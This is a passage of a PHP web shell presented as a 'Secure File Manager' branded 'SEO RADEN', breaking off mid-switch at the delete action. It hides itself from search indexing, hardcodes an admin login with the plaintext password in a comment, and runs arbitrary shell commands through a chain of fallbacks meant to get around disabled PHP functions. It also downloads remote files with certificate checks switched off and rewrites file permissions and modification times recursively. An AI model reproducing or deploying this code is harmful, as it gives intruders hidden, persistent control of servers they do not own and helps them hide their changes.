<?php
/**
 * SEO RADEN — Secure File Manager (single file) — Legacy/PHP-wide compatible
 *
 * Perubahan utama untuk kompatibilitas PHP lama → baru:
 * - Ganti semua array short syntax [...] menjadi array(...)
 * - Hindari null-coalescing (??) → pakai isset(...)? ... : ...
 * - Hilangkan anonymous function/closure di permsToString
 * - Tambah helper is_fn_usable() untuk cek disable_functions
 * - Runner command memakai is_fn_usable agar aman jika exec/system dilarang
 * - Perbaiki fetchUrlToFile() (bug bracket) + array() context
 * - Tambah wrapper fx_* untuk fungsi yang sering di-disable (opsional dipakai)
 * - Tambah je() sebagai pengganti json_encode untuk PHP 5.x tanpa ext-json
 * - Hilangkan type-hint ZipArchive, dan fallback zip → tar tanpa Phar::GZ
 */
if (!function_exists('is_fn_usable')) {
    function is_fn_usable($fn) {
        // Kalau fungsi inti-nya tidak ada, ya jelas tidak usable
        if (!function_exists($fn)) return false;

        // Hormati disable_functions (dan suhosin blacklist untuk build lama)
        $disabled = (string) @ini_get('disable_functions');
        $suhosin  = (string) @ini_get('suhosin.executor.func.blacklist');

        $blocked = array();
        if ($disabled !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $disabled)));
        if ($suhosin  !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $suhosin)));

        if (!empty($blocked)) {
            $blocked = array_filter(array_map('strtolower', $blocked));
            if (in_array(strtolower($fn), $blocked, true)) return false;
        }
        return true;
    }
}
date_default_timezone_set(@date_default_timezone_get() ? @date_default_timezone_get() : 'UTC');
session_start();
if (empty($_SESSION['csrf'])) {
    $_SESSION['csrf'] = bin2hex(biru_random_bytes(16));
}

/* ---------- Security Headers ---------- */
header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet, noimageindex', true);
header('Referrer-Policy: no-referrer');
header('X-Frame-Options: DENY');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

/* ---------- Auth ---------- */
define('AUTH_USER', 'admin');
define('AUTH_PASS_HASH', '$2y$13$LDKEeRZW0MKlqYZTZsv.6eghckFDxTN6PWlCP62Y0dRtkNjLz3v9i'); // pass : seoradenmas303@@$$

/* ---------- Util & Polyfills ---------- */
function h($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

/* JSON-encode safe for PHP 5.x (fallback sederhana) */
if (!function_exists('je')) {
    function je($v) {
        if (function_exists('json_encode')) {
            return json_encode($v);
        }
        // Fallback minimalis (string/angka/bool/null) — cukup untuk embed JS
        if (is_bool($v)) return $v ? 'true' : 'false';
        if (is_numeric($v)) return (string)$v;
        if ($v === null) return 'null';
        $s = str_replace(
            array("\\","\"","\r","\n","\t","/"),
            array("\\\\","\\\"","\\r","\\n","\\t","\\/"),
            (string)$v
        );
        return '"'.$s.'"';
    }
}

if (!function_exists('hash_equals')) {
    function hash_equals($a, $b) {
        if (!is_string($a) || !is_string($b)) return false;
        $len = strlen($a);
        if ($len !== strlen($b)) return false;
        $res = 0;
        for ($i=0; $i<$len; $i++) $res |= ord($a[$i]) ^ ord($b[$i]);
        return $res === 0;
    }
}

/* Check function not only exists, but also not disabled by disable_functions */
if (!function_exists('is_fn_usable')) {
  function is_fn_usable($fn) {
      if (!function_exists($fn)) return false;

      $disabled = (string) @ini_get('disable_functions');
      $suhosin  = (string) @ini_get('suhosin.executor.func.blacklist'); // untuk build lama

      $blocked = array();
      if ($disabled !== '') {
          $blocked = array_merge($blocked, array_map('trim', explode(',', $disabled)));
      }
      if ($suhosin !== '') {
          $blocked = array_merge($blocked, array_map('trim', explode(',', $suhosin)));
      }
      $blocked = array_filter(array_map('strtolower', $blocked));
      return !in_array(strtolower($fn), $blocked, true);
  }
}

function biru_random_bytes($len){
    if (is_fn_usable('random_bytes')) return random_bytes($len);
    if (is_fn_usable('openssl_random_pseudo_bytes')) {
        $strong = false;
        $b = openssl_random_pseudo_bytes($len, $strong);
        if ($b !== false && $strong) return $b;
    }
    $out = '';
    for ($i = 0; $i < $len; $i++) $out .= chr(mt_rand(0, 255));
    return $out;
}
function humanSize($b){
    $u = array('B','KB','MB','GB','TB'); $i = 0;
    while ($b >= 1024 && $i < count($u)-1){ $b/=1024; $i++; }
    return ($i ? number_format($b,2) : (string)$b) . ' ' . $u[$i];
}
function permsToString($f){
    $p = @fileperms($f); if ($p === false) return '??????????';
    $t = ($p & 0x4000) ? 'd' : (($p & 0xA000) ? 'l' : '-');
    $s  = (($p & 0x0100) ? 'r' : '-') . (($p & 0x0080) ? 'w' : '-') . (($p & 0x0040) ? 'x' : '-'); // owner
    $s .= (($p & 0x0020) ? 'r' : '-') . (($p & 0x0010) ? 'w' : '-') . (($p & 0x0008) ? 'x' : '-'); // group
    $s .= (($p & 0x0004) ? 'r' : '-') . (($p & 0x0002) ? 'w' : '-') . (($p & 0x0001) ? 'x' : '-'); // world
    return $t.$s;
}
function modeFromInput($s){
    $s=trim($s); if ($s==='') return 0644;
    if (ctype_digit($s)){ if ($s[0]!=='0') $s='0'.$s; return intval($s,8); }
    return 0644;
}
function isTextFile($p){
    if (is_dir($p) || !is_file($p)) return false;
    $ext = strtolower(pathinfo($p, PATHINFO_EXTENSION));
    $text = array('txt','md','json','js','ts','css','scss','less','html','htm','xml','svg','php','phtml','inc','ini','cfg','env','yml','yaml','py','rb','go','rs','c','h','cpp','hpp','java','kt','sql','csv','log');
    if (in_array($ext, $text, true)) return true;
    $s = @file_get_contents($p, false, null, 0, 2048);
    if ($s === false) return false;
    return (bool)preg_match('//u', $s);
}
function safeJoin($base,$child){
    $child = str_replace("\0",'',$child);
    if ($child==='') return $base;
    if ($child[0]===DIRECTORY_SEPARATOR || preg_match('~^[A-Za-z]:\\\\~',$child)) return $child;
    return rtrim($base,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$child;
}
function listDirEntries($dir){
    $h = @opendir($dir); if ($h===false) return array();
    $items=array(); while(false!==($e=readdir($h))){ if($e==='.'||$e==='..') continue; $items[]=$e; }
    closedir($h); return $items;
}
function rrmdir($p){
    if (!file_exists($p)) return true;
    if (is_file($p) || is_link($p)) return @unlink($p);
    $ok=true; $h=@opendir($p); if($h===false) return false;
    while(false!==($v=readdir($h))){ if($v==='.'||$v==='..') continue; $ok = rrmdir($p.DIRECTORY_SEPARATOR.$v) && $ok; }
    closedir($h);
    return @rmdir($p) && $ok;
}
function tryWriteFromTmp($tmp,$dest){
    $err=array(); if(@move_uploaded_file($tmp,$dest)) return array(true,null); $err[]='move_uploaded_file';
    if(@rename($tmp,$dest)) return array(true,null); $err[]='rename';
    if(@copy($tmp,$dest)) return array(true,null); $err[]='copy';
    $d=@file_get_contents($tmp); if($d!==false && @file_put_contents($dest,$d)!==false) return array(true,null); $err[]='get+put';
    $in=@fopen($tmp,'rb'); $out=@fopen($dest,'wb');
    if($in && $out){ $c=stream_copy_to_stream($in,$out); @fclose($in); @fclose($out); if($c!==false) return array(true,null); $err[]='stream_copy'; }
    else { $err[]='fopen'; }
    return array(false, implode('; ',$err).' failed');
}
if (!function_exists('fetchUrlToFile')) {
  function fetchUrlToFile($url, $dest) {
      $errs = array();

      // 1) cURL (jika tersedia & tidak didisable)
      if (is_fn_usable('curl_init')) {
          $ch = @curl_init($url);
          $fp = @fopen($dest, 'wb');
          if ($ch && $fp) {
              @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
              @curl_setopt($ch, CURLOPT_FILE, $fp);
              @curl_setopt($ch, CURLOPT_FAILONERROR, true);
              @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
              @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
              @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
              @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
              $ok = @curl_exec($ch);
              $e  = @curl_error($ch);
              @curl_close($ch);
              @fclose($fp);

              if ($ok) return array(true, null);
              $errs[] = 'cURL: ' . $e;
              @unlink($dest);
          } else {
              if ($ch) @curl_close($ch);
              if ($fp) @fclose($fp);
              $errs[] = 'init cURL/fopen';
          }
      }

      // Context utk wrapper stream
      $ctx = @stream_context_create(array(
          'http' => array(
              'follow_location' => 1,
              'timeout'         => 60,
              'header'          => "User-Agent: Mozilla/5.0\r\n",
          ),
          'ssl'  => array(
              'verify_peer'      => false,
              'verify_peer_name' => false,
          ),
      ));

      // 2) copy() langsung
      if (@copy($url, $dest, $ctx)) return array(true, null);
      $errs[] = 'copy(url)';

      // 3) get+put
      $d = @file_get_contents($url, false, $ctx);
      if ($d !== false && @file_put_contents($dest, $d) !== false) return array(true, null);
      $errs[] = 'get+put';

      // 4) stream_copy_to_stream
      $in  = @fopen($url, 'rb', false, $ctx);
      $out = @fopen($dest, 'wb');
      if ($in && $out) {
          $c = @stream_copy_to_stream($in, $out);
          @fclose($in);
          @fclose($out);
          if ($c !== false) return array(true, null);
          $errs[] = 'stream_copy';
          @unlink($dest);
      } else {
          $errs[] = 'fopen(url/dest)';
      }

      return array(false, implode('; ', $errs) . ' failed');
  }
}
function breadcrumbs($path){
    $out=array();
    if (preg_match('~^[A-Za-z]:\\\\~',$path)){
        $drive=substr($path,0,2); $rest=substr($path,2);
        $segments=array_values(array_filter(explode('\\\\',$rest),'strlen'));
        $acc=$drive.'\\'; $out[]=array($drive.'\\',$acc);
        foreach($segments as $s){ $acc.=$s.'\\'; $out[]=array($s,rtrim($acc,'\\')); }
    } else {
        $segments=array_values(array_filter(explode('/',$path),'strlen'));
        $acc='/'; $out[]=array('/','/');
        foreach($segments as $s){ $acc.=$s.'/'; $out[]=array($s,rtrim($acc,'/')); }
    }
    return $out;
}
function ensureCsrf(){
    if($_SERVER['REQUEST_METHOD']==='POST'){
        $sess = isset($_SESSION['csrf']) ? $_SESSION['csrf'] : '';
        $tok  = isset($_POST['csrf']) ? (string)$_POST['csrf'] : '';
        $ok = hash_equals($sess,$tok);
        if(!$ok){ http_response_code(400); exit('CSRF token invalid'); }
    }
}

/* ====== NEW HELPERS: create non-zero file ====== */
function create_nonzero_file($path, $userContent = null){
    $default = "Created by SEO RADEN @ ".date('c')."\n";
    $payload = (string)($userContent !== null ? $userContent : $default);
    if ($payload === '') $payload = $default;

    $w = @file_put_contents($path, $payload, LOCK_EX);
    if ($w !== false && $w > 0) return array(true, 'file_put_contents');

    $fp = @fopen($path, 'wb');
    if ($fp){
        $wr = @fwrite($fp, $payload);
        @fclose($fp);
        if ($wr !== false && $wr > 0) return array(true, 'fopen+fwrite');
    }

    $tmp = @tempnam(sys_get_temp_dir(), 'blue_');
    if ($tmp){
        @file_put_contents($tmp, $payload);
        if (@rename($tmp, $path)) {
            if (@filesize($path) > 0) return array(true, 'tempnam+rename');
        } elseif (@copy($tmp, $path)) {
            @unlink($tmp);
            if (@filesize($path) > 0) return array(true, 'tempnam+copy');
        }
        @unlink($tmp);
    }

    $src = @fopen('php://temp', 'wb+');
    if ($src){
        @fwrite($src, $payload);
        @rewind($src);
        $dst = @fopen($path, 'wb');
        if ($dst){
            $copied = @stream_copy_to_stream($src, $dst);
            @fclose($dst);
            if ($copied !== false && $copied > 0) { @fclose($src); return array(true, 'php://temp copy'); }
        }
        @fclose($src);
    }

    if (@touch($path)){
        $w2 = @file_put_contents($path, $payload, FILE_APPEND);
        if ($w2 !== false && $w2 > 0) return array(true, 'touch+append');
    }

    return array(false, 'All methods failed');
}

/* ---------- Auth UI ---------- */
function render_login($err=''){
    $csrf = isset($_SESSION['csrf']) ? $_SESSION['csrf'] : '';
    ?>
    <!doctype html><html lang="en" class="dark"><head>
      <meta charset="utf-8"><title>SEO RADEN</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
      <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
      <script src="https://cdn.tailwindcss.com"></script>
      <script>tailwind.config={theme:{extend:{fontFamily:{ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans']},colors:{canvas:{DEFAULT:'#0b1220',surface:'rgba(15,23,42,.8)'}},boxShadow:{soft:'0 10px 30px rgba(0,0,0,.45)',card:'0 6px 20px rgba(37,99,235,.22)'},borderRadius:{xl2:'18px'}}},darkMode:'class'}</script>
      <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
      <link href="https://www.svgrepo.com/show/475654/github-color.svg" rel="icon">
      <style>
        :root{color-scheme:dark} html,body{height:100%}
        body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
        .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(59,130,246,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:flex;align-items:center;justify-content:center;}
        .card{background:rgba(15,23,42,.8);border:1px solid rgba(148,163,184,.15);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.03);backdrop-filter:blur(8px);}
        .btn{background:linear-gradient(180deg,#3b82f6,#2563eb);color:#eaf2ff;border-radius:12px;padding:.7rem 1rem;font-weight:700;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(37,99,235,.25);}
        .btn:hover{filter:brightness(1.05);box-shadow:0 10px 26px rgba(37,99,235,.35)} .btn:active{transform:translateY(.5px)}
        .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.6rem .8rem;width:100%;background:#0b1220;color:#e5e7eb;}
        .field:focus{outline:none;box-shadow:0 0 0 4px rgba(59,130,246,.25);border-color:#3b82f6}
        .title{background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent}
      </style>
    </head><body class="shell text-slate-100">
      <div class="w-full max-w-md card p-6">
        <div class="mb-5 flex items-center justify-between">
          <div class="text-xl font-bold tracking-tight title">SEO RADEN</div>
          <span class="text-xs text-slate-400">PHP <?php echo h(PHP_VERSION); ?></span>
        </div>
        <?php if($err): ?><div class="mb-3 rounded-lg border border-red-900/60 bg-red-900/30 text-red-100 px-3 py-2"><?php echo h($err); ?></div><?php endif; ?>
        <form method="post" action="?a=login" class="space-y-3">
          <input type="hidden" name="csrf" value="<?php echo h($csrf); ?>">
          <div><label class="text-sm text-slate-300">Username</label><input class="field mt-1" name="user" type="text" autocomplete="username" required></div>
          <div><label class="text-sm text-slate-300">Password</label><input class="field mt-1" name="pass" type="password" autocomplete="current-password" required></div>
          <button class="btn w-full" type="submit">Login</button>
        </form>
        <p class="text-[12px] text-slate-400 mt-4 text-center">© SEO RADEN x Secure File Manager</p>
      </div>
    </body></html><?php
}
function biru_password_verify($password,$hash){
    if(is_fn_usable('password_verify')) return password_verify($password,$hash);
    if(strlen($hash)>=60 && ($hash[0].$hash[1])==='$2') return crypt($password,$hash)===$hash;
    return false;
}
function verify_login_creds($u,$p){
    if($u!==AUTH_USER) return false; $hash=AUTH_PASS_HASH; if($hash===''||strlen($hash)<20) return false; return biru_password_verify($p,$hash);
}

/* ---------- Icons ---------- */
function svgIcon($name,$class='ico'){
    $icons=array(
        'folder'=>'<svg viewBox="0 0 24 24" class="'.$class.'" aria-hidden="true"><path d="M10 4l2 2h6a2 2 0 012 2v1H4V6a2 2 0 012-2h4z" fill="currentColor" opacity=".12"/><path d="M3 9h18v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" fill="currentColor"/></svg>',
        'file'=>'<svg viewBox="0 0 24 24" class="'.$class.'" aria-hidden="true"><path d="M6 3h7l5 5v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5" fill="currentColor" opacity=".12"/><path d="M13 3v5a2 2 0 002 2h5" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>',
        'code'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M8 16l-4-4 4-4M16 8l4 4-4 4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>',
        'text'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M4 6h16M4 12h16M4 18h10" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>',
        'pwx'=>'<svg viewBox="0 0 48 48" class="'.$class.'" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"><g fill="currentColor"><g transform="translate(-700 -560)"><path d="M723.9985,560 C710.746,560 700,570.787092 700,584.096644 C700,594.740671 706.876,603.77183 716.4145,606.958412 C717.6145,607.179786 718.0525,606.435849 718.0525,605.797328 C718.0525,605.225068 718.0315,603.710086 718.0195,601.699648 C711.343,603.155898 709.9345,598.469394 709.9345,598.469394 C708.844,595.686405 707.2705,594.94548 707.2705,594.94548 C705.091,593.450075 707.4355,593.480194 707.4355,593.480194 C709.843,593.650366 711.1105,595.963499 711.1105,595.963499 C713.2525,599.645538 716.728,598.58234 718.096,597.964902 C718.3135,596.407754 718.9345,595.346062 719.62,594.743683 C714.2905,594.135281 708.688,592.069123 708.688,582.836167 C708.688,580.205279 709.6225,578.054788 711.1585,576.369634 C710.911,575.759726 710.0875,573.311058 711.3925,569.993458 C711.3925,569.993458 713.4085,569.345902 717.9925,572.46321 C719.908,571.928599 721.96,571.662047 724.0015,571.651505 C726.04,571.662047 728.0935,571.928599 730.0105,572.46321 C734.5915,569.345902 736.603,569.993458 736.603,569.993458 C737.9125,573.311058 737.089,575.759726 736.8415,576.369634 C738.3805,578.054788 739.309,580.205279 739.309,582.836167 C739.309,592.091712 733.6975,594.129257 728.3515,594.725612 C729.2125,595.469549 729.9805,596.939353 729.9805,599.18773 C729.9805,602.408949 729.9505,605.006706 729.9505,605.797328 C729.9505,606.441873 730.3825,607.191834 731.6005,606.9554 C741.13,603.762794 748,594.737659 748,584.096644 C748,570.787092 737.254,560 723.9985,560"/></g></g></svg>',
        'img'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M4 5h16v14H4z" fill="currentColor" opacity=".12"/><circle cx="8.5" cy="9.5" r="1.5" fill="currentColor"/><path d="M4 16l4-4 3 3 3-2 6 5" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>',
        'pdf'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M6 3h7l5 5v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5" fill="currentColor" opacity=".12"/><text x="7" y="17" font-size="8" font-family="ui-sans-serif" fill="currentColor">PDF</text></svg>',
        'sheet'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M6 3h12a2 2 0 012 2v14a2 2 0 01-2 2H6a2 2 0 01-2-2V5" fill="currentColor" opacity=".12"/><path d="M8 8h8M8 12h8M8 16h8" stroke="currentColor" stroke-width="2"/></svg>',
        'zip'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M6 3h7l5 5v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5" fill="currentColor" opacity=".12"/><path d="M11 5h2v2h-2v2h2v2h-2" stroke="currentColor" stroke-width="2"/></svg>',
        'db'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><ellipse cx="12" cy="6" rx="8" ry="3" fill="currentColor" opacity=".12"/><path d="M4 6v12c0 1.7 3.6 3 8 3s8-1.3 8-3V6" fill="none" stroke="currentColor" stroke-width="2"/></svg>',
        'search'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><circle cx="11" cy="11" r="7" stroke="currentColor" stroke-width="2" fill="none"/><path d="M20 20l-3-3" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>',
    );
    return isset($icons[$name]) ? $icons[$name] : $icons['file'];
}
function iconSvgFor($p){
    if (is_dir($p)) return svgIcon('folder');
    $e=strtolower(pathinfo($p, PATHINFO_EXTENSION));
    if (in_array($e,array('zip','rar','7z'))) return svgIcon('zip');
    if (in_array($e,array('jpg','jpeg','png','gif','webp','bmp','svg'))) return svgIcon('img');
    if (in_array($e,array('pdf'))) return svgIcon('pdf');
    if (in_array($e,array('csv','xls','xlsx'))) return svgIcon('sheet');
    if (in_array($e,array('sql'))) return svgIcon('db');
    if (in_array($e,array('php','js','ts','css','scss','less','html','htm','xml','yml','yaml','ini','cfg'))) return svgIcon('code');
    if (in_array($e,array('txt','md','log','json'))) return svgIcon('text');
    return svgIcon('file');
}

/* ---------- Shell helpers ---------- */
if(!function_exists('make_cd_prefix')){
    function make_cd_prefix($cwd){
        if(!$cwd) return '';
        if(DIRECTORY_SEPARATOR==='\\') return 'cd /d '.escapeshellarg($cwd).' && ';
        return 'cd '.escapeshellarg($cwd).' && ';
    }
}
if(!function_exists('wrap_cmd_for_shell')){
    function wrap_cmd_for_shell($cmd){
        if(DIRECTORY_SEPARATOR==='\\') return 'cmd.exe /C '.$cmd;
        return '/bin/sh -c '.escapeshellarg($cmd);
    }
}

/* ---------- Command runners (respect disable_functions) ---------- */
if(!function_exists('run_with_proc_open')){
    function run_with_proc_open($cmd,$cwd=null,$timeout=30){
        if(!is_fn_usable('proc_open')) return null;
        $des=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w')); $pipes=array(); $proc=@proc_open($cmd,$des,$pipes,$cwd?:null,null);
        if(!is_resource($proc)) return null;
        if(isset($pipes[1])&&is_resource($pipes[1])) @stream_set_blocking($pipes[1],false);
        if(isset($pipes[2])&&is_resource($pipes[2])) @stream_set_blocking($pipes[2],false);
        if(isset($pipes[0])&&is_resource($pipes[0])) @fclose($pipes[0]);
        $buf=''; $start=time();
        while(true){
            $status=@proc_get_status($proc); $running=$status && !empty($status['running']);
            $r=array(); if(isset($pipes[1])&&is_resource($pipes[1])) $r[]=$pipes[1]; if(isset($pipes[2])&&is_resource($pipes[2])) $r[]=$pipes[2];
            if($r){ $w=null;$e=null; @stream_select($r,$w,$e,1); foreach($r as $p){ $chunk=@fread($p,8192); if($chunk!==false && $chunk!=='') $buf.=$chunk; } }
            else { usleep(100000); }
            if(!$running) break;
            if($timeout>0 && (time()-$start)>=$timeout){
                @proc_terminate($proc,9);
                foreach($pipes as $p){ if(is_resource($p)) @fclose($p); }
                @proc_close($proc);
                return array('method'=>'proc_open','code'=>124,'out'=>$buf."\n[timeout after {$timeout}s]");
            }
        }
        foreach($pipes as $p){ if(is_resource($p)) @fclose($p); }
        $code=@proc_close($proc); if($code===-1) $code=null;
        return array('method'=>'proc_open','code'=>$code,'out'=>$buf);
    }
}
if(!function_exists('run_with_shell_exec')){
    function run_with_shell_exec($cmd,$cwd=null){
        if(!is_fn_usable('shell_exec')) return null;
        $full = make_cd_prefix($cwd) . $cmd . ' 2>&1';
        $out = @shell_exec($full); if($out===null) return null;
        return array('method'=>'shell_exec','code'=>null,'out'=>$out);
    }
}
if(!function_exists('run_with_exec')){
    function run_with_exec($cmd,$cwd=null){
        if(!is_fn_usable('exec')) return null;
        $full = make_cd_prefix($cwd) . $cmd  . ' 2>&1';
        $lines=array(); $code=0; @exec($full,$lines,$code);
        return array('method'=>'exec','code'=>$code,'out'=>implode("\n",(array)$lines));
    }
}
if(!function_exists('run_with_system')){
    function run_with_system($cmd,$cwd=null){
        if(!is_fn_usable('system')) return null;
        $full = make_cd_prefix($cwd) . $cmd . ' 2>&1';
        ob_start(); @system($full,$code); $out=ob_get_clean();
        return array('method'=>'system','code'=>$code,'out'=>$out);
    }
}
if(!function_exists('run_with_popen')){
    function run_with_popen($cmd,$cwd=null){
        if(!is_fn_usable('popen')) return null;
        $full = make_cd_prefix($cwd) . $cmd . ' 2>&1';
        $h=@popen(wrap_cmd_for_shell($full),'r'); if(!is_resource($h)) return null;
        $buf=''; while(!feof($h)){ $chunk=@fread($h,8192); if($chunk===false) break; $buf.=$chunk; }
        @pclose($h); return array('method'=>'popen','code'=>null,'out'=>$buf);
    }
}
if(!function_exists('run_command_all')){
    function run_command_all($cmd,$cwd=null){
        $po=run_with_proc_open($cmd,$cwd,30); if($po) return $po;
        $order=array('run_with_shell_exec','run_with_exec','run_with_system','run_with_popen');
        foreach($order as $fn){
            if(function_exists($fn)){ $res=$fn($cmd,$cwd); if($res) return $res; }
        }
        return array('method'=>'none','code'=>127,'out'=>"Command runner not available on this PHP build.");
    }
}

/* ---------- chmod/mtime recursion ---------- */
function biru_apply_chmod($path,$mode,$recursive,&$ok){
    if(!@chmod($path,$mode)) $ok=false;
    if($recursive && is_dir($path)){
        $h=@opendir($path);
        if($h!==false){
            while(false!==($v=readdir($h))){ if($v==='.'||$v==='..') continue; biru_apply_chmod($path.DIRECTORY_SEPARATOR.$v,$mode,true,$ok); }
            closedir($h);
        } else { $ok=false; }
    }
}
function biru_apply_mtime($path,$timestamp,$recursive,&$ok){
    if(!@touch($path,$timestamp,$timestamp)) $ok=false;
    if($recursive && is_dir($path)){
        $h=@opendir($path);
        if($h!==false){
            while(false!==($v=readdir($h))){ if($v==='.'||$v==='..') continue; biru_apply_mtime($path.DIRECTORY_SEPARATOR.$v,$timestamp,true,$ok); }
            closedir($h);
        } else { $ok=false; }
    }
}

/* =========================
 *        BOOT & ROUTER
 * ========================= */
$current = isset($_GET['p']) ? (string)$_GET['p'] : getcwd();
if (!is_dir($current)) $current = getcwd();
$current = rtrim($current, DIRECTORY_SEPARATOR);
if ($current === '') $current = DIRECTORY_SEPARATOR;

$action = isset($_GET['a']) ? $_GET['a'] : '';

/* ---- AUTH ---- */
if ($action === 'login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    ensureCsrf();
    $u = isset($_POST['user']) ? $_POST['user'] : ''; $p = isset($_POST['pass']) ? $_POST['pass'] : '';
    if (verify_login_creds($u,$p)) { $_SESSION['auth']=true; $_SESSION['who']=$u; header('Location: ?p='.rawurlencode($current)); exit; }
    else { render_login('Incorrect username or password'); exit; }
}
if (empty($_SESSION['auth'])) { render_login(); exit; }

/* ---- DOWNLOAD ---- */
if ($action === 'download') {
    $f = safeJoin($current, isset($_GET['f']) ? $_GET['f'] : '');
    if (!is_file($f) || !is_readable($f)) { http_response_code(404); exit('Not found'); }
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($f).'"');
    header('Content-Length: '.filesize($f));
    header('X-Content-Type-Options: nosniff');
    readfile($f); exit;
}

/* ---- RAW (inline view) ---- */
if ($action === 'raw') {
    $f = safeJoin($current, isset($_GET['f']) ? $_GET['f'] : '');
    if (!is_file($f) || !is_readable($f)) { http_response_code(404); exit('Not found'); }
    $mime = 'application/octet-stream';
    if (is_fn_usable('finfo_open')) { $fi=@finfo_open(FILEINFO_MIME_TYPE); if($fi){ $det=@finfo_file($fi,$f); if($det) $mime=$det; @finfo_close($fi);} }
    elseif (is_fn_usable('mime_content_type')) { $tmp=@mime_content_type($f); if($tmp) $mime=$tmp; }
    header('Content-Type: '.$mime);
    header('Content-Length: '.filesize($f));
    header('X-Content-Type-Options: nosniff');
    header('Content-Disposition: inline; filename="'.basename($f).'"');
    readfile($f); exit;
}

/* ---- POST ACTIONS ---- */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ensureCsrf();
    $back = function () use ($current) { header('Location: ?p='.rawurlencode($current)); exit; };
    switch ($action) {
        case 'logout': {
            session_destroy(); header('Location: ?'); exit;
        }
        case 'new-file': {
            $name = trim((string)(isset($_POST['name']) ? $_POST['name'] : ''));
            $content = isset($_POST['content']) ? (string)$_POST['content'] : null;
            if ($name === '' || strpos($name, DIRECTORY_SEPARATOR)!==false) { $_SESSION['msg']='New File: invalid name'; return $back(); }
            $dst = safeJoin($current, $name);
            if (file_exists($dst)) { $_SESSION['msg']='New File: already exists'; return $back(); }
            list($ok,$how) = create_nonzero_file($dst, $content);
            $_SESSION['msg'] = $ok ? ("New File OK via {$how}: ".$name) : ('New File failed: '.$how);
            return $back();
        }
        case 'new-dir': {
            $name = trim((string)(isset($_POST['name']) ? $_POST['name'] : ''));
            if ($name === '' || strpos($name, DIRECTORY_SEPARATOR)!==false) { $_SESSION['msg']='New Folder: invalid name'; return $back(); }
            $dst = safeJoin($current, $name);
            if (file_exists($dst)) { $_SESSION['msg']='New Folder: already exists'; return $back(); }
            $ok = @mkdir($dst, 0775, false);
            $_SESSION['msg'] = $ok ? ('New Folder OK: '.$name) : 'New Folder failed';
            return $back();
        }
        case 'edit-save': {
            $file = safeJoin($current, isset($_POST['file']) ? $_POST['file'] : '');
            $content = isset($_POST['content']) ? $_POST['content'] : '';
            $mode = isset($_POST['mode']) ? $_POST['mode'] : 'txt';
            if (!is_file($file) || !is_writable($file)) { $_SESSION['msg']='Save failed (file not writable)'; return $back(); }
            if ($mode === 'b64') {
                $data = base64_decode($content, true);
                if ($data === false) { $_SESSION['msg']='Save failed: invalid Base64 data'; return $back(); }
                @file_put_contents($file, $data);
            } else {
                @file_put_contents($file, $content);
            }
            $_SESSION['msg'] = 'Saved: '.basename($file); return $back();
        }
        case 'rename': {
            $old = safeJoin($current, isset($_POST['old']) ? $_POST['old'] : '');
            $new = trim((string)(isset($_POST['new']) ? $_POST['new'] : ''));
            if ($new === '' || strpos($new, DIRECTORY_SEPARATOR) !== false) { $_SESSION['msg']='Invalid new name'; }
            else { $dst = safeJoin($current, $new); $_SESSION['msg'] = @rename($old,$dst) ? 'Rename OK' : 'Rename failed'; }
            return $back();
        }
        case 'chmod': {
            $target = safeJoin($current, isset($_POST['target']) ? $_POST['target'] : '');
            $mode = modeFromInput((string)(isset($_POST['mode']) ? $_POST['mode'] : '0644'));
            $rec = !empty($_POST['recursive']); $ok=true; biru_apply_chmod($target,$mode,$rec,$ok);
            $_SESSION['msg'] = $ok ? 'Chmod OK' : 'Chmod partially failed'; return $back();
        }
        case 'delete': {
